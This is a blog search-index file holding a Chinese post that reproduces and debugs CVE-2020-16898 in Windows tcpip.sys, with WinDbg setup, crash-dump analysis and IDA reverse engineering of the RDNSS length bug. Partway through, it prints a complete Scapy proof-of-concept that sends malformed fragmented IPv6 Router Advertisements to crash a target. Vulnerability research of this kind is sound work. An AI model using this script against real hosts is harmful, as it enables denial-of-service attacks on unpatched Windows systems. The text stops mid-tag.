<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>CVE-2020-16898调试复现记录</title>
      <link href="/2020/11/10/cve-2020-16898-diao-shi-fu-xian-ji-lu/"/>
      <url>/2020/11/10/cve-2020-16898-diao-shi-fu-xian-ji-lu/</url>
      
        <content type="html"><![CDATA[<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><h2 id="环境信息"><a href="#环境信息" class="headerlink" title="环境信息"></a>环境信息</h2><ul><li>物理机：Windows 10 </li><li>调试器：Windbg</li><li>虚拟机：Windows 10 1909版本</li><li>反编译：IDA</li></ul><h2 id="配置虚拟机"><a href="#配置虚拟机" class="headerlink" title="配置虚拟机"></a>配置虚拟机</h2><p>由于我的本地环境win10中启用了hyper-v,在vmware 16.x中安装Windows 10  1709版本开启debug后会有冲突，会造成假死，所以使用了Windows 10 1909版本 </p><p>在win10系统中复制一个启动项，并且打开调试模式。代码如下</p><pre><code>bcdedit /dbgsettings serial baudrate:115200 debugport:1bcdedit /copy {current} /d DebugEntrybcdedit /displayorder {current} {ID}bcdedit /debug {ID} ONbcdedit /set {default} bootmenupolicy legacy</code></pre><p><img src="CVE-2020-16898%E8%B0%83%E8%AF%95%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95.assets/image-20201110194402977.png" alt="image-20201110194402977"></p><p>vmware中打开IPV6，同时添加一个调试串口。</p><p><img src="CVE-2020-16898%E8%B0%83%E8%AF%95%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95.assets/image-20201110195236313.png" alt="image-20201110195236313"></p><p>设置管道 <code>\\.\pipe\com_1</code></p><p><img src="CVE-2020-16898%E8%B0%83%E8%AF%95%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95.assets/image-20201110195437003.png" alt="image-20201110195437003"></p><p>设置网络为NAT模式，VMnet8</p><p><img src="CVE-2020-16898%E8%B0%83%E8%AF%95%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95.assets/image-20201110195547560.png" alt="image-20201110195547560"></p><h2 id="配置windbg"><a href="#配置windbg" class="headerlink" title="配置windbg"></a>配置windbg</h2><p>不同版本的windbg使用不同的配置方式</p><p><img src="CVE-2020-16898%E8%B0%83%E8%AF%95%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95.assets/image-20201110200043264.png" alt="image-20201110200043264"></p><p>配置符号</p><p><img src="CVE-2020-16898%E8%B0%83%E8%AF%95%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95.assets/image-20201110200331013.png" alt="image-20201110200331013"></p><p>旧版本的windbg需要在桌面创建快捷方式，在后面添加参数。</p><p><code>-b -k com:pipe,port=\\.\pipe\com_1,resets=0,reconnect -y</code></p><p><img src="CVE-2020-16898%E8%B0%83%E8%AF%95%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95.assets/image-20201110200849555.png" alt="image-20201110200849555"></p><h1 id="详细分析"><a href="#详细分析" class="headerlink" title="详细分析"></a>详细分析</h1><p>开始调试，设置reconnet，等待win10开机。</p><p><img src="CVE-2020-16898%E8%B0%83%E8%AF%95%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95.assets/image-20201110201410605.png" alt="image-20201110201410605"></p><p>win10开机后，windbg处于调试运行状态，此时切换到kali中运行exp。</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> scapy<span class="token punctuation">.</span>all <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> scapy<span class="token punctuation">.</span>layers<span class="token punctuation">.</span>inet6 <span class="token keyword">import</span> ICMPv6NDOptEFA<span class="token punctuation">,</span> ICMPv6NDOptRDNSS<span class="token punctuation">,</span> ICMPv6ND_RA<span class="token punctuation">,</span> IPv6<span class="token punctuation">,</span> IPv6ExtHdrFragment<span class="token punctuation">,</span> fragment6v6_dst <span class="token operator">=</span> <span class="token string">"fd15:4ba5:5a2b:1008:34b0:3a5d:3646:3313"</span>v6_src <span class="token operator">=</span> <span class="token string">"fd15:4ba5:5a2b:1008:351e:f5f7:5804:d271"</span>p_test_half <span class="token operator">=</span> <span class="token string">'A'</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">8</span> <span class="token operator">+</span> b<span class="token string">"\x18\x30"</span> <span class="token operator">+</span> b<span class="token string">"\xFF\x18"</span>p_test <span class="token operator">=</span> p_test_half <span class="token operator">+</span> <span class="token string">'A'</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">4</span>c <span class="token operator">=</span> ICMPv6NDOptEFA<span class="token punctuation">(</span><span class="token punctuation">)</span>e <span class="token operator">=</span> ICMPv6NDOptRDNSS<span class="token punctuation">(</span><span class="token punctuation">)</span>e<span class="token punctuation">.</span>len <span class="token operator">=</span> <span class="token number">21</span>e<span class="token punctuation">.</span>dns <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"AAAA:AAAA:AAAA:AAAA:FFFF:AAAA:AAAA:AAAA"</span><span class="token punctuation">,</span><span class="token string">"AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA"</span><span class="token punctuation">,</span><span class="token string">"AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA"</span><span class="token punctuation">,</span><span class="token string">"AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA"</span><span class="token punctuation">,</span><span class="token string">"AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA"</span><span class="token punctuation">,</span><span class="token string">"AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA"</span><span class="token punctuation">,</span><span class="token string">"AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA"</span><span class="token punctuation">,</span><span class="token string">"AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA"</span><span class="token punctuation">,</span><span class="token string">"AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA"</span><span class="token punctuation">,</span><span class="token string">"AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA"</span> <span class="token punctuation">]</span>aaa <span class="token operator">=</span> ICMPv6NDOptRDNSS<span class="token punctuation">(</span><span class="token punctuation">)</span>aaa<span class="token punctuation">.</span>len <span class="token operator">=</span> <span class="token number">8</span>pkt <span class="token operator">=</span> ICMPv6ND_RA<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">/</span> aaa <span class="token operator">/</span> \      Raw<span class="token punctuation">(</span>load<span class="token operator">=</span><span class="token string">'A'</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">16</span><span class="token operator">*</span><span class="token number">2</span> <span class="token operator">+</span> p_test_half <span class="token operator">+</span> b<span class="token string">"\x18\xa0"</span><span class="token operator">*</span><span class="token number">6</span><span class="token punctuation">)</span> <span class="token operator">/</span> c <span class="token operator">/</span> e <span class="token operator">/</span> c <span class="token operator">/</span> e <span class="token operator">/</span> c <span class="token operator">/</span> e <span class="token operator">/</span> c <span class="token operator">/</span> e <span class="token operator">/</span> c <span class="token operator">/</span> e <span class="token operator">/</span> e <span class="token operator">/</span> e <span class="token operator">/</span> e <span class="token operator">/</span> e <span class="token operator">/</span> e <span class="token operator">/</span> ep_test_frag <span class="token operator">=</span> IPv6<span class="token punctuation">(</span>dst<span class="token operator">=</span>v6_dst<span class="token punctuation">,</span> src<span class="token operator">=</span>v6_src<span class="token punctuation">,</span> hlim<span class="token operator">=</span><span class="token number">255</span><span class="token punctuation">)</span><span class="token operator">/</span> \              IPv6ExtHdrFragment<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">/</span>pktl<span class="token operator">=</span>fragment6<span class="token punctuation">(</span>p_test_frag<span class="token punctuation">,</span> <span class="token number">200</span><span class="token punctuation">)</span><span class="token keyword">for</span> p <span class="token keyword">in</span> l<span class="token punctuation">:</span>    send<span class="token punctuation">(</span>p<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>修改exp中的源地址和目标地址，源地址修改为kali的ipv6地址。</p><p><img src="CVE-2020-16898%E8%B0%83%E8%AF%95%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95.assets/image-20201110224712749.png" alt="image-20201110224712749"></p><p>修改目标地址</p><p><img src="CVE-2020-16898%E8%B0%83%E8%AF%95%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95.assets/image-20201110225345566.png" alt="image-20201110225345566"></p><p>运行后win10假死状态，windbg中断，可以发现发生了异常，使用!analyze -v运行分析。</p><p><img src="CVE-2020-16898%E8%B0%83%E8%AF%95%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95.assets/image-20201110223459821.png" alt="image-20201110223459821"></p><p>发现了错误的位置 <code>tcpip!_report_gsfailure</code></p><p><img src="CVE-2020-16898%E8%B0%83%E8%AF%95%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95.assets/image-20201110225721871.png" alt="image-20201110225721871"></p><p>输入kv 显示当前线程的堆栈，发现了两个有问题的堆栈位置。可以在ida中进行继续分析。crash原因的是GS机制的Security Cookie校验失败。</p><pre><code>07 fffff803`0f899108 fffff803`0f11b197 tcpip!_report_gsfailure+0x508 fffff803`0f899110 aaaaaaaa`aaaaaaaa tcpip!Ipv6pHandleRouterAdvertisement+0x10ef</code></pre><p><img src="CVE-2020-16898%E8%B0%83%E8%AF%95%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95.assets/image-20201110225901670.png" alt="image-20201110225901670"></p><h2 id="相关资料"><a href="#相关资料" class="headerlink" title="相关资料"></a>相关资料</h2><p><a href="https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2020-16898" target="_blank" rel="noopener">漏洞影响范围</a></p><p><img src="CVE-2020-16898%E8%B0%83%E8%AF%95%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95.assets/image-20201114222208771.png" alt="image-20201114222208771"></p><p>这次出现漏洞所涉及到的<a href="https://tools.ietf.org/html/rfc8106#section-5.3.1" target="_blank" rel="noopener">RFC 8106</a>协议报文如下：</p><pre><code>0                   1                   2                   30 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+|     Type      |     Length    |           Reserved            |+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+|                           Lifetime                            |+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+|                                                               |:            Addresses of IPv6 Recursive DNS Servers            :|                                                               |+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</code></pre><p>原文如下：</p><blockquote><pre><code>      The validity of DNS options is checked with the Length field;      that is, the value of the Length field in the RDNSS option is      greater than or equal to the minimum value (3) and satisfies the      requirement that (Length - 1) % 2 == 0.  The value of the Length      field in the DNSSL option is greater than or equal to the minimum      value (2).  Also, the validity of the RDNSS option is checked with      the &quot;Addresses of IPv6 Recursive DNS Servers&quot; field; that is, the      addresses should be unicast addresses.</code></pre></blockquote><p>几个比较重要的点是：</p><blockquote><ul><li><strong>Type（1个字节）</strong>：RDNSS选项类型的类型为 25（0x19）</li><li><strong>Length（1个字节）</strong>：如果该选项中包含一个 IPv6 地址，则长度取最小值3 。每增加一个 RDNSS 地址，长度就会增加2。接收器使用“长度”字段来确定选项中IPv6地址的数量</li><li><strong>Addresses of IPv6 Recursive DNS Servers（可变长度，由“Length”字段确定）</strong>：一个或多个递归DNS服务器的 128 位 IPv6 地址 。地址个数为（Length - 1）/ 2</li></ul></blockquote><p>长度字段以8字节为单位定义选项的长度。头部的大小为8个字节，每个IPv6地址的长度增加了16个字节。这意味着，如果该结构包含<em>n个</em>IPv6地址，则应将其长度设置为<em>1 + 2 \</em> n*。长度为偶数时会发生此错误，导致代码错误地解释下一个选项结构的开头。</p><p>查询微软的docs关于<code>NdisGetDataBuffer</code>函数的相关信息。</p><pre class="line-numbers language-c++"><code class="language-c++">PVOID NdisGetDataBuffer(  PNET_BUFFER NetBuffer,  //指向NET_BUFFER结构的指针.  ULONG       BytesNeeded, // [输入]请求的数据的连续字节数。  PVOID       Storage,  // [in，可选]指向缓冲区的指针，如果调用者未提供缓冲区，则为NULL。缓冲区的大小必须大于或等于BytesNeeded中指定的字节数 。如果该值为非NULL，并且请求的数据不连续，则NDIS将请求的数据复制到Storage指示的区域 。  UINT        AlignMultiple, // [in]对齐倍数，以2的幂表示。例如2、4、8、16等。如果 AlignMultiple为1，则没有对齐要求。  UINT        AlignOffset  // [in]与对齐倍数的偏移量（以字节为单位）。);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p> <strong>返回值</strong></p><p> <strong>NdisGetDataBuffer</strong>返回一个指向连续数据开始的指针，或者返回<strong>NULL</strong>。</p><p> 如果<em>NetBuffer</em> 参数指向的<a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/ndis/ns-ndis-_net_buffer_data" target="_blank" rel="noopener">NET_BUFFER</a>结构中 <a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/ndis/ns-ndis-_net_buffer" target="_blank" rel="noopener">NET_BUFFER_DATA</a>结构的 <strong>DataLength</strong>成员 小于 <em>BytesNeeded</em>参数中的值，则返回值为<strong>NULL</strong>。</p><p> 如果缓冲区中请求的数据是连续的，则返回值是指向NDIS提供的位置的指针。如果数据不连续，则NDIS使用 <em>Storage</em>参数如下：</p><ul><li><p>如果 <em>Storage</em>参数为非<strong>NULL</strong>，则NDIS将数据复制到<em>Storage</em>的缓冲区中 。返回值是传递给<em>Storage</em>参数的指针 。</p></li><li><p>如果 <em>Storage</em>参数为<strong>NULL</strong>，则返回值为<strong>NULL</strong>。</p><p>由于无法映射数据缓冲区的资源不足情况， 返回值也可以为<strong>NULL</strong>。即使数据是连续的或<em>Storage</em>参数为非<strong>NULL，</strong>也可能会发生这种情况。</p></li></ul></blockquote><p>_NET_BUFFER 结构如下：</p><pre class="line-numbers language-c++"><code class="language-c++">typedef struct _NET_BUFFER { //NET_BUFFER结构指定通过网络发送或接收的数据。  union {    struct {      PNET_BUFFER Next; // 指向NET_BUFFER结构的链表中的下一个NET_BUFFER结构的指针。如果此结构是列表中的最后一个NET_BUFFER结构，则此成员为NULL。      PMDL        CurrentMdl; // 指向当前驱动程序正在使用的第一个MDL的指针。该成员提供了一种优化，它可以跳过当前驱动程序未使用的任何MDL，从而提高性能。      ULONG       CurrentMdlOffset; // 由CurrentMdl成员指定的MDL中已使用数据空间开头的偏移量（以字节为单位）。      union {        ULONG  DataLength; // 指向NET_BUFFER结构的链表中的下一个NET_BUFFER结构的指针。如果此结构是列表中的最后一个NET_BUFFER结构，则此成员为NULL。        SIZE_T stDataLength; // MDL链中已用数据空间的长度（以字节为单位）。最大长度为0xFFFFFFFF字节。该成员与DataLength相同，但其类型为SIZE_T而不是ULONG。      };      PMDL        MdlChain; // 指向映射数据缓冲区的MDL链接列表的指针。数据缓冲区存储网络数据。      ULONG       DataOffset; //从MDL链的起点到MDL链中的网络数据的起点的偏移量（以字节为单位）。此偏移量也是未使用的数据空间的大小（以字节为单位）。    };    SLIST_HEADER      Link;    NET_BUFFER_HEADER NetBufferHeader;  };  USHORT                ChecksumBias;  USHORT                Reserved;  NDIS_HANDLE           NdisPoolHandle;  PVOID                 NdisReserved[2];  PVOID                 ProtocolReserved[6];  PVOID                 MiniportReserved[4];  NDIS_PHYSICAL_ADDRESS DataPhysicalAddress;  union {    PNET_BUFFER_SHARED_MEMORY SharedMemoryInfo;    PSCATTER_GATHER_LIST      ScatterGatherList;  };} NET_BUFFER, *PNET_BUFFER;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>NET_BUFFER_DATA</code>的结构如下：</p><pre class="line-numbers language-c++"><code class="language-c++">typedef struct _NET_BUFFER_DATA {  PNET_BUFFER            Next; //指向NET_BUFFER结构的链表中的下一个NET_BUFFER结构的指针。如果此结构是列表中的最后一个NET_BUFFER结构，则此成员为NULL。  PMDL                   CurrentMdl; // 指向当前驱动程序正在使用的第一个MDL的指针。该成员提供了一种优化，它可以跳过当前驱动程序未使用的任何MDL，从而提高性能。  ULONG                  CurrentMdlOffset; // 由CurrentMdl成员指定的MDL中已 使用数据空间开头的偏移量（以字节为单位） 。  NET_BUFFER_DATA_LENGTH NbDataLength; // MDL链中已用数据空间的长度（以字节为单位）。最大长度为0xFFFFFFFF字节。  PMDL                   MdlChain; // 指向映射数据缓冲区的MDL链接列表的指针。数据缓冲区存储网络数据。  ULONG                  DataOffset; // 从MDL链的起点到MDL链中的网络数据的起点的偏移量（以字节为单位）。此偏移量也是未使用的数据空间的大小（以字节为单位） 。} NET_BUFFER_DATA, *PNET_BUFFER_DATA;该 NET_BUFFER_HEADER结构包含一个NET_BUFFER_DATA结构，对于定义数据 NET_BUFFER结构。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="IDA-分析"><a href="#IDA-分析" class="headerlink" title="IDA 分析"></a>IDA 分析</h2><p>使用ida加载tcpip.sys，将tcpip.pdb文件放在同目录，ida即可自动进行加载这个符号文件。</p><p><img src="CVE-2020-16898%E8%B0%83%E8%AF%95%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95.assets/image-20201113194836750.png" alt="image-20201113194836750"></p><p>在funtion窗口中搜索<code>Ipv6pHandleRouterAdvertisement</code>，根据崩溃的位置，从这里开始进行分析。根据上图的堆栈，由于</p><p><code>08 fffff803 0f899110 aaaaaaaa aaaaaaaa tcpip!Ipv6pHandleRouterAdvertisement+0x10ef</code></p><p>这条堆栈，所以一定是Ipv6pHandleRouterAdvertisement函数触发了GS的检查，因为是进行GS检查后才进行pop出去返回地址，由这里可以继续分析。</p><p><code>Ipv6pHandleRouterAdvertisement</code>函数存在两个循环，第一个循环遍历所有headers，做一些基本的验证，如length的大小，第二个循环用于处理包，并且该阶段不再验证。</p><p><img src="CVE-2020-16898%E8%B0%83%E8%AF%95%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95.assets/image-20201113232618155.png" alt="image-20201113232618155"></p><p>结合其他的分析文档以及使用windbg下断点分析，可以确定<code>Ipv6pHandleRouterAdvertisement</code>函数为发生溢出的函数。</p><p>继续分析可知是由于<code>Ipv6pUpdateRDNSS</code>函数造成的。确切原因是当length字段为偶数时，<code>Ipv6pUpdateRDNSS</code>函数未按预期调整网络缓冲区指针。</p><p><img src="CVE-2020-16898%E8%B0%83%E8%AF%95%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95.assets/image-20201113202559941.png" alt="image-20201113202559941"></p><h3 id="漏洞函数"><a href="#漏洞函数" class="headerlink" title="漏洞函数"></a>漏洞函数</h3><p><code>tcpip!Ipv6pHandleRouterAdvertisement</code>可以分为两个大while，可以作为两次对于包的处理。第一次对于包的处理是正确的，第二次在解析option结构时，计算长度的算法出错了，造成了读取到了错误的Type，进而伪造了一个option。</p><p>借用两个图来说明这个过程。在第一次循环中，正确的解析了Length如果是4的情况下，</p><p><img src="CVE-2020-16898%E8%B0%83%E8%AF%95%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95.assets/image-20201115004113432.png" alt="image-20201115004113432"></p><p>正如上面EXP流量数据包中的数据。</p><p><img src="CVE-2020-16898%E8%B0%83%E8%AF%95%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95.assets/image-20201115004311281.png" alt="image-20201115004311281"></p><p>在经历过<code>Ipv6pUpdateRDNSS</code>函数后，偏移量的指针出现了8字节的错误。所以后八个字节被解析成了option。</p><p><img src="CVE-2020-16898%E8%B0%83%E8%AF%95%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95.assets/Visualization-loop-2-PoC-BSOD-for-CVE-2020-16898.png" alt="img"></p><p>对照EXP流量数据包中。</p><p><img src="CVE-2020-16898%E8%B0%83%E8%AF%95%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95.assets/image-20201115004523469.png" alt="image-20201115004523469"></p><p>两个循环简化的代码如下：</p><pre class="line-numbers language-c++"><code class="language-c++">  while ( 1 )  {    switch ( v25 )    {      case 1u:        // 省略      case 3u:       // 省略      case 0x18u:        v222[0] = 0i64;        v222[1] = 0i64;        v222[2] = 0i64;        if ( v29 > 0x18u          || (v145 = *((_BYTE *)NdisGetDataBuffer(v9, v29, v222, 1u, 0) + 2), v145 > 0x80u)          || v145 > 0x40u && v29 < 0x18u          || v145 && v29 < 0x10u )        {          *a3 = 24;          goto LABEL_275;        }        break;      case 0x19u:        if ( (*(_BYTE *)(v11 + 404) & 0x40) != 0 && v29 < 0x18u )          *a3 = 25;        break;      default:        if ( v25 == 31 && (*(_BYTE *)(v11 + 404) & 0x40) != 0 && v29 < 0x10u )        {          *a3 = 26;LABEL_275:          v27 = v9->DataLength;          goto LABEL_33;        }        break;    }         // 省略        while ( 1 )        {         // 省略          if ( *v75 == 0x18 )          {            v77 = 8 * (unsigned __int8)v75[1];            v223[0] = 0i64;            v223[1] = 0i64;            v223[2] = 0i64;            v220[0] = 0i64;            v220[1] = 0i64;            v154 = (unsigned __int8 *)NdisGetDataBuffer(v69, v76, v223, 1u, 0);            v227 = _mm_load_si128((const __m128i *)&_xmm);            v176 = v227.m128i_u32[((unsigned __int64)v154[3] >> 3) & 3];            if ( v176 != -1 )            {              v155 = v154[2];              v156 = _byteswap_ulong(*((_DWORD *)v154 + 1));              v157 = 2 * v156;              if ( (2 * v156) >> 1 != v156 )                v157 = -1;              CopyPrefix(v220, v154 + 8, v154[2], 16i64);              IppUpdateAutoConfiguredRoute(v11, (_DWORD)Buf2, v65, (unsigned int)v220, v155, v157, v176);              v73 = v171;              if ( v64 <= v157 )                v157 = v64;              v64 = v157;            }            goto LABEL_115;          }          if ( *v75 == 0x19 )          {            if ( (*(_BYTE *)(v11 + 404) & 0x40) != 0 )            {              Ipv6pUpdateRDNSS(v11, v69, Buf2, v191, &v172);              goto LABEL_309;            }          }          else if ( *v75 == 0x1F && (*(_BYTE *)(v11 + 404) & 0x40) != 0 )          {            Ipv6pUpdateDNSSL(v11, v69, Buf2, (unsigned int)v191, &v172);LABEL_309:            v77 = v168;            goto LABEL_118;          }LABEL_114:// 省略}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>第一个循环中判断的case:0x19 第一次循环会进入这里，这里读取长度时是正确的。</p><p><img src="CVE-2020-16898%E8%B0%83%E8%AF%95%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95.assets/image-20201114232618024.png" alt="image-20201114232618024"></p><p>继续分析第二个while Ipv6pUpdateRDNSS函数。由上述资料可以得到 NdisGetDataBuffer 返回了RDNSS option的结构指针，该结构+1字节以后正是Length的地址，后根据公式计算出有多少个地址。 </p><p><code>NetioAdvanceNetBuffer</code> 函数的作用是 将 NET_BUFFER 结构中的DataOffset与参数2相加，代表偏移增加。</p><p><img src="CVE-2020-16898%E8%B0%83%E8%AF%95%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95.assets/image-20201113222439361.png" alt="image-20201113222439361"></p><p>通过交叉引用可以分析出v37 是下面while的次数。这个漏洞的原因就是计算Length算法存在问题，上文中已经分析过，如果v9+1指向的内存的数据(也就是Length)是偶数时，将会触发漏洞。</p><p><img src="CVE-2020-16898%E8%B0%83%E8%AF%95%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95.assets/image-20201113222900308.png" alt="image-20201113222900308"></p><p>而v34是进行比较的值，对v34进行分析引用，v34是循环次数，但是由于v37的计算错误，所以循环会造成少一次。</p><p><img src="CVE-2020-16898%E8%B0%83%E8%AF%95%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95.assets/image-20201115001438387.png" alt="image-20201115001438387"></p><p>下面开始进入了while的循环。</p><p><img src="CVE-2020-16898%E8%B0%83%E8%AF%95%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95.assets/image-20201113223905055.png" alt="image-20201113223905055"></p><p>这里可以观察到NetioAdvanceNetBuffer(v16, 0x10u);这句代码的意思是DataOffset += 0x10 ，但是由上文可知。在为偶数时，会发生少循环一轮，DataOffset就会少计算一次，这时返回到了上层函数tcpip!Ipv6pHandleRouterAdvertisement的第二个while循环中，读取了伪造的type 进入了case:0x18，伪造的Length在调用 NdisGetDataBuffer 函数后，导致栈溢出的发生。位置如下图：</p><p><img src="CVE-2020-16898%E8%B0%83%E8%AF%95%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95.assets/image-20201115003106997.png" alt="image-20201115003106997"></p><p>假设<code>Ipv6pHandleRouterAdvertisement</code>中的第一个判断 Packet的循环认为Options应该是 4*8 = 0x20偏移，但<code>Ipv6pUpdateRDNSS</code>认为下一个Options在0x18处执行结束后，从0x18处读取 Options 这里是没有经过Packet安全校验的，其Type可以是任意值，且如果Packet是分包，内容不在一个包里，进入了0x18 <code>NdisGetDataBuffer</code>函数读取到其他内容，也会把数据复制到参数3里才导致的栈溢出。<br>总结上述过程，这个问题本质是 Ipv6pUpdateRDNSS 计算错误了。没有其他漏洞配合，CVE-2020-16898是无法直接造成RCE的。</p><h2 id="动态调试"><a href="#动态调试" class="headerlink" title="动态调试"></a>动态调试</h2><p>先记录一下造成crash的数据包格式。</p><p><img src="CVE-2020-16898%E8%B0%83%E8%AF%95%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95.assets/image-20201114224536554.png" alt="image-20201114224536554"></p><p>后续在调试中可以观察到这个数据包在内存中的变化。</p><p>设置几个断点</p><pre><code>bp tcpip!Ipv6pHandleRouterAdvertisement            // bp tcpip!Ipv6pHandleRouterAdvertisement + 0xB85D9  // 第一次while中 case 0x18bp tcpip!Ipv6pHandleRouterAdvertisement + 0xB85FB  // 第一次while中 case 0x19bp tcpip!Ipv6pHandleRouterAdvertisement + 0xB8A2A  // 第二次while中 case 0x18bp tcpip!Ipv6pHandleRouterAdvertisement + 0xB8A50  // 第二次while中 case  0x19 bp tcpip!Ipv6pHandleRouterAdvertisement + 0xB8A89 //  漏洞位置bp tcpip!Ipv6pUpdateRDNSS + 0x7F // 第一次执行NdisGetDataBuffer函数bp tcpip!Ipv6pUpdateRDNSS + 0x94 // 第一次执行NetioAdvanceNetBuffer函数bp tcpip!Ipv6pUpdateRDNSS + 0xAC // 长度计算 v37 = (*((unsigned __int8 *)v9 + 1) - 1) / 2;bp tcpip!Ipv6pUpdateRDNSS + 0x15C // while中的NdisGetDataBuffer函数bp tcpip!Ipv6pUpdateRDNSS + 0x177 // while中的 NetioAdvanceNetBuffer </code></pre><p><img src="CVE-2020-16898%E8%B0%83%E8%AF%95%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95.assets/image-20201115005655715.png" alt="image-20201115005655715"></p><p>命中第一次while中的断点</p><p><img src="CVE-2020-16898%E8%B0%83%E8%AF%95%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95.assets/image-20201115005916039.png" alt="image-20201115005916039"></p><p><img src="CVE-2020-16898%E8%B0%83%E8%AF%95%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95.assets/image-20201115010133278.png" alt="image-20201115010133278"></p><p>第一次进入</p><p><img src="CVE-2020-16898%E8%B0%83%E8%AF%95%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95.assets/image-20201115010444370.png" alt="image-20201115010444370"></p><p><img src="CVE-2020-16898%E8%B0%83%E8%AF%95%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95.assets/image-20201115010315783.png" alt="image-20201115010315783"></p><p>第一次执行<code>NdisGetDataBuffer</code>函数之前，查看net_buffer结构，发现CurrentMdlOffset的偏移是0x10同时查看数据包的数据。</p><p><img src="CVE-2020-16898%E8%B0%83%E8%AF%95%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95.assets/image-20201115011451109.png" 